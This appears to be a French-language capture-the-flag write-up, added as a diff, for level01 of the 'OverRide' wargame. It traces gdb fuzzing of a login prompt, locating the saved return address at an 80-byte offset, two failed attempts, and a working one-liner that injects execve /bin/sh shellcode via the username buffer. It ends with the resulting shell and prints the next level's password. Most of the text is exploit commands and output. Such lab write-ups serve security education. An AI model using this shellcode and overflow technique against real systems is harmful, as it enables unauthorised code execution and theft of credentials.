@@ -1,0 +1,168 @@
+---> Alors on essaye de faire SEGV dans verify_user_name:
+
+(gdb) r
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/users/level01/level01
+********* ADMIN LOGIN PROMPT *********
+Enter Username: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+verifying username....
+
+nope, incorrect username...
+
+[Inferior 1 (process 1866) exited with code 01]
+
+---> PAs l'air de vouloir segfault...
+---> Dans verify_password maintenant:
+
+(gdb) r
+Starting program: /home/users/level01/level01
+********* ADMIN LOGIN PROMPT *********
+Enter Username: dat_will
+verifying username....
+
+Enter Password:
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+nope, incorrect password...
+
+
+Program received signal SIGSEGV, Segmentation fault.
+0x41414141 in ?? ()
+
+---> Alright !
+---> On recher ou exactement maintenant.
+---> Le buffer fait 64 de lenght (0x5c - 0x1c) + 1 int donc on commence a 68:
+level01@OverRide:~$ python -c 'print "A"*68'
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+(gdb) r
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/users/level01/level01
+********* ADMIN LOGIN PROMPT *********
+Enter Username: dat_will
+verifying username....
+
+Enter Password:
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDEEEEFFFFGGGG
+nope, incorrect password...
+
+
+Program received signal SIGSEGV, Segmentation fault.
+0x45454545 in ?? ()
+(gdb)
+
+
+---> OK ! donc on reecrit l'EIP en "EEEE" donc 80 caracteres + address.
+--- -> On recupere l'adresse de buff dans main:
+(gdb) x/100wx $esp+0x1c
+0xffffd6cc:	  0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd6dc:	  0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd6ec:	  0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd6fc:	  0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd70c:	  0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd71c:	  0x42424242	0x0000000a	0xffffd7b4	0xffffd7bc
+
+----> puis on l'injecte:
+level01@OverRide:~$ (echo "dat_will" ; python -c 'print "\x90"*55+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" + "\xff\xff\xd6\xcc"[::-1]') | ./level01
+********* ADMIN LOGIN PROMPT *********
+Enter Username: verifying username....
+
+Enter Password:
+nope, incorrect password...
+
+Segmentation fault (core dumped)
+
+----> failed !
+----> On essaye dans l'environement.
+level01@OverRide:~$ export SHELLCODE=`python -c 'print "\x90"*10 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"'`
+
+---> on recupere l'adresse grace a un petit programme:
+
+$ cat /tmp/addr.c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+int main(int argc, char *argv[]) {
+	char *ptr;
+
+	if(argc < 3) {
+			  printf("Usage: %s <environment variable> <target program name>\n", argv[0]);
+			  				 				 		   		      return 0;
+																						   }
+
+																											   ptr = getenv(argv[1]);
+
+    if (ptr == 0) {
+        printf("'%s' isn't defined\n", argv[1]);
+        return -1;
+    }
+
+    /* Compensate for prgram name length difference */
+	ptr += (strlen(argv[0]) - strlen(argv[2])) * 2;
+	printf("'%s' will be at %p\n", argv[1], ptr);
+
+    return 0;
+}
+level01@OverRide:~$ gcc /tmp/addr.c -o /tmp/a.out
+level01@OverRide:~$ /tmp/a.out SHELLCODE ./level01
+'SHELLCODE' will be at 0x7fffffffe8da
+level01@OverRide:~$ (echo "dat_will" ; python -c 'print "A"*80 + "\xff\xff\xe8\xda"[::-1]') | ./level01
+********* ADMIN LOGIN PROMPT *********
+Enter Username: verifying username....
+
+Enter Password:
+nope, incorrect password...
+
+Segmentation fault (core dumped)
+
+---> putin re failed !
+---> bon 3eme idee, on reflechit et verify_user_name verifie seulement 7 octets...
+---> peut on en mettre plus apres dat_will ??? 
+
+(gdb) r
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/users/level01/level01
+********* ADMIN LOGIN PROMPT *********
+Enter Username: dat_will and i am the king
+verifying username....
+
+Enter Password:
+
+----> OK !
+---> on essaie de mettre notre shellcode apres
+---> l'adresse de a_user_name etant 0x804a040 + 7 ("dat_will")
+
+level01@OverRide:~$ (python -c 'print "dat_will"+"\x90"*50 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"' ; python -c 'print "A"*80 + "\x08\x04\xa0\x50"[::-1]' ; cat) | ./level01
+********* ADMIN LOGIN PROMPT *********
+Enter Username: verifying username....
+
+Enter Password:
+nope, incorrect password...
+
+ls
+ls: cannot open directory .: Permission denied
+cat ../level02/.pass
+cat: ../level02/.pass: Permission denied
+cd ../level02
+ls
+level02
+ls -la
+total 21
+dr-xr-x---+ 1 level02 level02   80 Sep 13  2016 .
+dr-x--x--x  1 root    root     260 Oct  2  2016 ..
+-rw-r--r--  1 level02 level02  220 Sep 10  2016 .bash_logout
+lrwxrwxrwx  1 root    root       7 Sep 13  2016 .bash_profile -> .bashrc
+-rw-r--r--  1 level02 level02 3533 Sep 10  2016 .bashrc
+-rw-r--r--+ 1 level02 level02   41 Oct 19  2016 .pass
+-rw-r--r--  1 level02 level02  675 Sep 10  2016 .profile
+-rwsr-s---+ 1 level03 users   9452 Sep 10  2016 level02
+cat .pass
+PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
+
+
+
+
+
+et voilaaa ... !!!
